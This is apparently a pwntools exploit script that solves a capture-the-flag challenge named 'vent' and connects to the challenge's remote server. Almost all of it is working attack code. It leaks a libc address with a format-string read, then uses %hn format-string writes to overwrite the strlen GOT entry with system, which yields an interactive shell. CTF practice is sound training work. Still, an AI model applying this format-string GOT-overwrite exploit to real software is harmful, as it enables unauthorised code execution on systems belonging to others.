#!/usr/bin/python3

from pwn import *

exe = ELF('vent_patched', checksec=False)
libc = ELF("libc.so.6")
context.binary = exe
def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* 0x40122A

        c
        ''')
        input()


if args.REMOTE:
    p = remote('vent.squ1rrel-ctf-codelab.kctf.cloud', 1337)
else:
    p = process(exe.path)
GDB()


def se(pa):
    sla(b'about?', pa)


se(b'%43$p')
p.recvline()
p.recvline()
libc.address = int(p.recvline(), 16) - 0x24083
info("libc " + hex(libc.address))

package = {
    libc.sym.system & 0xffff: exe.got.strlen,
    libc.sym.system >> 16 & 0xffff: exe.got.strlen+2,
    libc.sym.system >> 32 & 0xffff: exe.got.strlen+4,
}
order = sorted(package)

pa = f'%{order[0]}c%19$hn%{order[1]-order[0]}c%20$hn%{order[2]-order[1]}c%21$hn'.encode().ljust(0x58)
pa += p64(package[order[0]]) + p64(package[order[1]]) + p64(package[order[2]])
se(pa)
p.interactive()
